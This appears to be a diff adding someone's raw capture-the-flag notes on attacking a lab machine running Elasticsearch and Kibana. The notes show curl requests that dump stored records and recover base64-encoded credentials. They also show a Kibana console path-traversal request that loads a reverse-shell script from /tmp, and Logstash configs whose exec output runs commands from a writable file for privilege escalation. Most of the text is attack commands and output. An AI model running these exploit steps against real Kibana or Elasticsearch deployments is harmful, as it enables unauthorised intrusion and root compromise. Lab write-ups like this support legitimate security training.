@@ -1,0 +1,74 @@
+the needle in the haystack is "key" 
+= la aguja en el pajar es "clave"
+= bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
+
+After parsing json php in :9200/needle/key:
+cmd : curl --header "Content-Type: application/json" --request POST --data '{"typarse_exception","reason":"request body is required"}' http://10.10.10.115:9200/needle/key
+
+
+{"_index":"needle","_type":"key","_id":"wp3skW0B28YvJC7E_gOx","_version":1,"result":"created","_shards":{"total":2,"successful":1,"failed":0},"_seq_no":0,"_primary_term":1}
+
+
+curl -X GET http://10.10.10.115:9200/quotes/quote/45 ->
+I have to save the key for the machine: dXNlcjogc2VjdXJpdHkg
+
+curl -X GET http://10.10.10.115:9200/quotes/quote/111 ->
+Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=
+This key cannot be lost, I save it here: cGFzczogc3BhbmlzaC5pcy5rZXk=
+
+
+user: security
+pass: spanish.is.key
+
+
+
+Services listening only on localhost.
+and
+Processes running with root permissions
+and
+SELinux present
+
+
+http://localhost:8080/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/reverse_shell.js
+
+
+curl http://localhost:5601/api/console/api_server -d '{"sense_version":"@@SENSE_VERSION","apis":"../../../../../../../../../../../tmp/reverse_shell.js"}' -H "kbn-xsrf: reporting"
+
+-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
+-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
+-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
+cat filter.conf
+filter {
+	if [type] == "execute" {
+		grok {
+			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+		}
+	}
+}
+cat input.conf
+input {
+	file {
+		path => "/opt/kibana/logstash_*"
+		start_position => "beginning"
+		sincedb_path => "/dev/null"
+		stat_interval => "10 second"
+		type => "execute"
+		mode => "read"
+	}
+}
+cat output.con
+cat: output.con: No existe el fichero o el directorio
+cat output.conf
+output {
+	if [type] == "execute" {
+		stdout { codec => json }
+		exec {
+			command => "%{comando} &"
+		}
+	}
+}
+
+
+
+
+curl -i -X GET "http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../tmp/reverse_shell.js"
